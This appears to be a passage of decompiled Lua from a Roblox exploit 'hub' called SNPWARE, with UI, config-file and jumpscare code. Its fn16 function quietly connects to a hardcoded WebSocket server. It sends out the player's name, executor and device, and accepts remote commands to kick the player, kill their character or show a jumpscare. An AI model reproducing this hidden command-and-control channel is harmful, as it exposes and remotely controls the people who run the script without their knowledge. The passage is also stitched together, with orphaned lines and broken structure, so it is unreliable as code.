		imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
		imageLabel.Position = UDim2.fromScale(0.5, 0.5)
		imageLabel.Size = UDim2.fromScale(1, 1)
		imageLabel.Image = v_4
		imageLabel.ScaleType = Enum.ScaleType.Stretch
		imageLabel.ImageRectSize = Vector2.new(n2, n3)
		imageLabel.ImageRectOffset = Vector2.new(0, 0)
		local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
		uiAspectRatioConstraint.AspectRatio = n2 / n3
		uiAspectRatioConstraint.Parent = imageLabel
		imageLabel.Parent = frame
		fn23(imageLabel, 8)
		local n7 = 0

		local connection = RunService.RenderStepped:Connect(function(deltaTime)
			n7 += deltaTime
			local n8

			if arg4 then
				n8 = math.floor(n7 * n6) % n5
			else
				local n9 = n5 - 1
				n8 = math.clamp(math.floor(n7 * n6), 0, n9)
			end

			local n9 = n8 % n4
			local n10 = math.floor(n8 / n4)
			imageLabel.ImageRectSize = Vector2.new(n2, n3)
			imageLabel.ImageRectOffset = Vector2.new(n9 * n2, n10 * n3)
		end)

		pcall(function()
			sound:Play()
		end)

		local n8 = tonumber(sound.TimeLength) or 0
		local n9 = tonumber(v_5.durationSec) or 0

		if n8 < 0.5 then
			n8 = n9
		end

		if n8 < 0.5 then
			n8 = n5 / math.max(1, n6)
		end

		if n9 > n8 then
			n8 = n9
		end

		task.wait(n8)

		if connection then
			connection:Disconnect()
		end

		pcall(function()
			sound:Stop()
			sound:Destroy()
		end)

		v_6:Destroy()
	end

	local function fn34(arg)
		if flag then
			return
		end

				fn24("Nightmareattack.jpg", "fnaf-4-nightmare-jumpscare-sound.mp3", Enum.ScaleType.Stretch, 4.5)

	end

	local function fn35(arg)
		if type(arg) ~= "table" then
			return
		end
		local v_3 = string.lower(tostring(arg.action or ""))
		local v_4 = string.lower(tostring(arg.target or "*"))
		local v_5 = string.lower(localPlayer.Name)
		local v_6 = string.lower(tostring(localPlayer.DisplayName or ""))
		local flag3 = v_4 == "" or v_4 == "*" or v_4 == "all" or v_4 == v_5
		local flag4

		if flag3 then
			flag4 = flag3
		else
			flag4 = v_6 ~= "" and v_4 == v_6
		end

		if not flag4 then
			return
		end

		if v_3 == "kick" then
			local str2 = tostring(arg.reason or "")
			localPlayer:Kick(str2 ~= "" and str2 or "SNPWARE KICK")
		elseif v_3 == "kill" then
			local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.Health = 0
			end
		elseif v_3 == "jumpscare" then
			local v_7 = string.lower(tostring(arg.variant or arg.scare or "fnaf"))
			task.spawn(fn34, v_7)
		end
	end

	fn16 = function()
		local snpStatsWsGen = getgenv()._SNP_STATS_WS_GEN

		while snpStatsWsGen == getgenv()._SNP_STATS_WS_GEN do
			local ok, snpStatsWs = pcall(function()
				return WebSocket.connect("ws://132.243.222.170:8000")
			end)

			if snpStatsWsGen ~= getgenv()._SNP_STATS_WS_GEN then
				ok = ok and snpStatsWs

				if ok then
					pcall(function()
						snpStatsWs:Close()
					end)
				end

				break
			else
				if ok then
					getgenv()._SNP_STATS_WS = snpStatsWs
					local str2 = identifyexecutor and identifyexecutor() or "Unknown"
					local r3thDevice = getgenv().R3TH_Device or "Unknown"
					local valid = getgenv().valid or "Unknown"
					snpStatsWs:Send("auth:" .. game.Players.LocalPlayer.Name .. "|" .. tostring(str2) .. "|" .. tostring(r3thDevice) .. "|" .. tostring(valid) .. "|")
					local flag3 = false
					local v_3 = snpStatsWsGen

					snpStatsWs.OnMessage:Connect(function(arg)
						if v_3 ~= getgenv()._SNP_STATS_WS_GEN then
							return
						end

						if arg == nil then
							return
						end

						if type(arg) == "table" then
							arg = arg.data or arg.Data or arg.message or arg.Message or arg[1]
						end

						local str3 = tostring(arg or "")
						if str3 == "" then
							return
						end

						if str3 == "pingONL" then
							task.defer(function()
								pcall(function()
									snpStatsWs:Send("IMHERE")
								end)
							end)

							return
						end

						if str3:sub(1, 9) == "shutdown:" then
							local str4 = str3:sub(10)

							if str4 == "" then
								str4 = "SNPWARE SHUTDOWN"
							end

							task.defer(function()
								game:GetService("Players").LocalPlayer:Kick(str4)
							end)

							return
						end

						if str3:sub(1, 10) == "admin_cmd:" then
							local str4 = str3:sub(11)

							task.defer(function()
								local ok2, result = pcall(function()
									return game:GetService("HttpService"):JSONDecode(str4)
								end)

								if ok2 and type(result) == "table" then
									pcall(fn35, result)
								end
							end)

							return
						end

						if str3:sub(1, 11) == "stats_data:" then
							local str4 = str3:sub(12)

							task.defer(function()
								local v_4 = string.split(str4, "|")
								local currentlyOnline = v_4[1] or "0"
								local str5 = v_4[2] or "0"
								local str6 = v_4[3] or "0"
								local str7 = v_4[4] or "None"
								local str8 = v_4[5] or "0"
								local str9 = v_4[6] or "0"
								local str10 = v_4[7] or "0"
								local str11 = v_4[8] or "0"
								fn17("online", "Currently online: " .. currentlyOnline)
								local str12 = string.format("Computers or Notebooks: %s\nTablets or Phones: %s", str6, str5)

								if tonumber(str8) > 0 then
									str12 ..= "\nUnknown: " .. str8
								end

								local str13 = string.format("VPS: %s\nGITHUB: %s", str9, str10)

								if tonumber(str11) > 0 then
									str13 ..= "\nUnknown: " .. str11
								end

								fn17("users", str12)
								fn17("executors", str7)
								fn17("path", str13)
							end)
						elseif str3:sub(1, 13) == "notification:" then
							local str4 = str3:sub(14)

							task.defer(function()
								fn18(str4)
							end)
						end
					end)

					snpStatsWs.OnClose:Connect(function()
						flag3 = true
					end)

					while true do
						task.wait(1)
						if not (flag3 or v_3 ~= getgenv()._SNP_STATS_WS_GEN) then
							continue
						end
						break
					end

					if v_3 == getgenv()._SNP_STATS_WS_GEN then
						fn17("online", "Server connection lost")
					end

					if getgenv()._SNP_STATS_WS == snpStatsWs then
						getgenv()._SNP_STATS_WS = nil
					end
				else
					fn17("online", "Server offline. Retrying...")
				end

				task.wait(5)
			end
		end
	end

				return
			end
			local imageTransparency = valueslider.backgroundTransparency * 0.1

			pcall(function()
				Window:SetBackgroundImageTransparency(imageTransparency)
			end)

			pcall(function()
				customAssetsForEachSheetLabel(function(arg)
					arg.ImageTransparency = imageTransparency
				end)
			end)
		end,
	})

	Tabs.settings:Section({ Title = "loc:section_configs" })
	selectedHubConfig = nil
	hubConfigNameDraft = ""

	hubPersistSelectedConfigName = function(arg)
		if not writefile then
			return
		end

		if type(arg) ~= "string" or arg == "" then
			if delfile and isfile and isfile(HUB_LAST_CONFIG_FILE) then
				pcall(delfile, HUB_LAST_CONFIG_FILE)
			end

			return
		end

		pcall(writefile, HUB_LAST_CONFIG_FILE, arg)
	end

	hubReadPersistedSelectedConfigName = function()
		if not readfile or not isfile or not isfile(HUB_LAST_CONFIG_FILE) then
			return nil
		end
		local ok, result = pcall(readfile, HUB_LAST_CONFIG_FILE)
		if not ok or type(result) ~= "string" then
			return nil
		end
		local match = result:match("^%s*(.-)%s*$")
		if match == "" then
			return nil
		end

		if type(isfile) == "function" and not isfile(hubConfigPath(match)) then
			hubPersistSelectedConfigName(nil)
			return nil
		end
		return match
	end

	hubPersistAutostartConfigName = function(autostartConfig)
		if not writefile then
			return
		end

		if type(autostartConfig) ~= "string" or autostartConfig == "" then
			dropdownval.autostartConfig = nil

			if delfile and isfile and isfile(HUB_AUTOSTART_CONFIG_FILE) then
				pcall(delfile, HUB_AUTOSTART_CONFIG_FILE)
			end

			return
		end

		dropdownval.autostartConfig = autostartConfig
		pcall(writefile, HUB_AUTOSTART_CONFIG_FILE, autostartConfig)
	end

	hubReadPersistedAutostartConfigName = function()
		if not readfile or not isfile or not isfile(HUB_AUTOSTART_CONFIG_FILE) then
			return nil
		end
		local ok, result = pcall(readfile, HUB_AUTOSTART_CONFIG_FILE)
		if not ok or type(result) ~= "string" then
			return nil
		end
		local match = result:match("^%s*(.-)%s*$")
		if match == "" then
			return nil
		end
		return match
	end

	hubResolveAutostartConfigName = function()
		if not values.autostartConfig then
			return nil
		end
		local autostartConfig = selectedHubConfig

		if type(autostartConfig) ~= "string" or autostartConfig == "" then
			autostartConfig = dropdownval.autostartConfig or hubReadPersistedAutostartConfigName()
		end

		if type(autostartConfig) ~= "string" or autostartConfig == "" then
			return nil
		end
		return autostartConfig
	end

	hubSyncAutostartToggleUi = function(arg)
